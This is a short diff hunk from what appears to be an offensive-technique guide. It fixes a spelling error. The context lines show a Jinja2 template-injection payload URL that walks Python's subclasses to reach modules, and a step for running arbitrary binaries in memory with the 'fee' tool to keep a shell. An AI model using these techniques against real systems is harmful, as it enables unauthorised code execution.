@@ -46,7 +46,7 @@ http://127.0.0.1:1337/?name={{(1).__class__.__base__.__subclasses__()[216]()._mo
 
 ### Execute arbitrary binaries
 
-Generate the payload to load in memory with `fee /bin/ls > ls.py`. **AND UPDATE** the payload with the following code at the beggining **or you will lose your shell**:
+Generate the payload to load in memory with `fee /bin/ls > ls.py`. **AND UPDATE** the payload with the following code at the begining **or you will lose your shell**:
 
 ```python
 # imports ...
